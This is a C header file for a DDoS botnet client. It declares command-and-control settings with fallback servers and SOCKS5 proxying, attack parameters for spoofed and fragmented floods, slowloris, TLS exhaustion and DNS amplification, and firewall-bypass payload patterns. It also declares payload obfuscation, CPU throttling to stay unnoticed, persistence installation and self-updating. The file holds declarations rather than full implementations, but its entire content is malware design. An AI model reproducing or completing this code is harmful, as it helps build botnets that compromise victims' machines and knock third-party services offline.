#ifndef BOT_H
#define BOT_H

#define _GNU_SOURCE

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <net/if.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/file.h>
#include <poll.h>
#include <sys/poll.h>
#include <sys/resource.h>
#include <ifaddrs.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <zlib.h>

/* ── Constants ─────────────────────────────────── */
#define MAX_PAYLOAD 65507
#define MEGA_BATCH 65535
#define MEGA_BATCH_MAX 65535
#define MEGA_SOCKS_PER_CPU 512
#define MEGA_MAX_SOCKS 65535
#define MEGA_PAYLOAD 1400
#define MAX_SOCKETS 65535
#define RING_BUF_SIZE (MEGA_BATCH * MEGA_PAYLOAD)
#define SOCKET_BUF_SIZE_MAX (128 * 1024 * 1024)
#define SOCKET_BUF_SIZE_MIN (4 * 1024 * 1024)
#define MAX_PAYLOADS 256
#define MAX_PROCESSES 8
#define CPU_LOAD_THRESHOLD 85  /* default: pause if >85% */

/* ── Types ─────────────────────────────────────── */
typedef struct {
    char c2_host[256];
    int c2_port;
    char c2_path[256];
    int use_ssl;
    char socks5_proxy[256]; /* "ip:port" or empty */
    int protocol;           /* 0=websocket, 1=http2-poll (gRPC-lite) */
    int heartbeat_int;
    int reconnect_min, reconnect_max, stale_timeout;
    unsigned int default_pps, default_threads;
    unsigned int spoof_mode, fragmentation;
    char bot_version[32];
    /* Multi-C2 fallback list */
    char c2_list[8][512];  /* up to 8 C2 URLs */
    int c2_count;
    int c2_current;        /* index of current C2 */
    int c2_fail_count;     /* consecutive failures on current C2 */
} Config;

typedef struct {
    char hwid[32], ip_addr[64], os_ver[128];
    int cpu_cores, ram_mb, net_mbps;
} SysInfo;

typedef struct {
    char target[256];
    int port;
    char method[32];
    int duration_secs;
    unsigned int max_pps, max_threads;
    unsigned int spoof_mode, fragmentation;
    unsigned int slowloris, tls_exhaust, mega_mode;
    char payload_b64[8192];     /* base64 game payload from server */
    char proxies[16384];        /* proxy list "ip:port\nip:port..." */
    /* Comma-separated open ports from C2 scan, e.g. "80,443,3389,1433".
     * Empty → bot only hits `port` (default, no multi-port). */
    char open_ports[4096];
} AttackParams;

typedef struct {
    double rate, burst, tokens;
    struct timespec last;
    pthread_mutex_t mtx;
} TokenBucket;

/* ── Globals ───────────────────────────────────── */
extern volatile int g_shutdown;
extern volatile int g_attack_stop;
extern unsigned long long g_pkt_count;
extern unsigned long long g_byte_count;
extern volatile int g_attack_active;
extern char g_bot_uuid[64];
extern char g_cur_task_id[64];

/* Atomic attack-state helpers */
static inline void request_attack_stop(void) {
    __sync_lock_test_and_set(&g_attack_stop, 1);
}
static inline void clear_attack_stop(void) {
    __sync_lock_release(&g_attack_stop);
}
static inline int is_attack_stop(void) {
    return __sync_fetch_and_add(&g_attack_stop, 0);
}
static inline void set_attack_active(int v) {
    if (v) __sync_lock_test_and_set(&g_attack_active, 1);
    else __sync_lock_release(&g_attack_active);
}
static inline int is_attack_active(void) {
    return __sync_fetch_and_add(&g_attack_active, 0);
}

static inline void pkt_sent(int bytes) {
    __sync_fetch_and_add(&g_pkt_count, 1ULL);
    __sync_fetch_and_add(&g_byte_count, (unsigned long long)(bytes > 0 ? bytes : 1));
}

typedef struct {
    AttackParams atk;
    Config *cfg;
} BgAttackCtx;

/* ── payload ───────────────────────────────────── */
void gen_payloads(void);
void gen_http(unsigned char *buf, int *len, const char *host);
void gen_tls_hello(unsigned char *buf, int *len, const char *sni);
void gen_game_pkt(unsigned char *buf, int *len);
void encrypt_payload(unsigned char *buf, int len);
void obfuscate_payload(unsigned char *buf, int len);
uint32_t rand_vn_ip(void);

extern unsigned char g_payloads[MAX_PAYLOADS][MAX_PAYLOAD];
extern int g_payload_lens[MAX_PAYLOADS];
extern int g_total_payloads;
extern const unsigned char DNS_ANY_PAYLOAD[];
extern const size_t DNS_ANY_LEN;

typedef struct {
    char name[64];
    char payload[256];
    int length;
    int effectiveness;
    int category;
} bypass_pattern_t;

extern const bypass_pattern_t enhanced_bypass_patterns[];
extern const int num_bypass_patterns;

int select_optimal_bypass_pattern(int burst_count, int consecutive_failures);
void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures);
void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx);

/* ── cpu_gov ───────────────────────────────────── */
int get_cpu_usage(void);
int should_throttle(void);  /* returns microseconds to sleep, 0 = ok */
int should_pause(void);
void cpu_monitor_start(void);

/* ── sock_util ─────────────────────────────────── */
int create_udp_socket(void);
int create_raw_socket(int proto);
int create_bypass_socket(void);
uint16_t ip_csum(void *d, size_t l);
uint16_t tcp_csum(void *ip, void *tcp);
uint16_t udp_csum(void *ip, void *udp, void *payload, int pay_len);

/* ── ws_client ─────────────────────────────────── */
typedef struct {
    int sockfd;
    SSL *ssl;
    SSL_CTX *ctx;
    char host[256], path[256];
    int port, use_ssl;
    char socks5[256]; /* "ip:port" SOCKS5 proxy, or empty */
    pthread_mutex_t io;
    unsigned char rbuf[8192];
    int rbuf_len;
    int rbuf_off;
} WS;

int ws_connect(WS *ws, const char *bot_id);
void ws_disconnect(WS *ws);
int ws_send(WS *ws, const char *msg);
int ws_recv(WS *ws, char *buf, int cap);

/* ── attack ────────────────────────────────────── */
void *bg_attack_thread(void *arg);

/* ── sysinfo ───────────────────────────────────── */
void sys_info(SysInfo *info);
void gen_uuid_v4(char *out, int cap);
void get_bot_uuid(char *out, int cap);

/* ── json ──────────────────────────────────────── */
int json_int(const char *msg, const char *key);
void json_str(const char *msg, const char *key, char *out, int cap);

/* ── daemon ────────────────────────────────────── */
void save_c2_url(const char *url);
int load_c2_url(char *out, int cap);
void install_persistence(const char *self_path);
void check_updates(const char *current_tag);

#endif /* BOT_H */
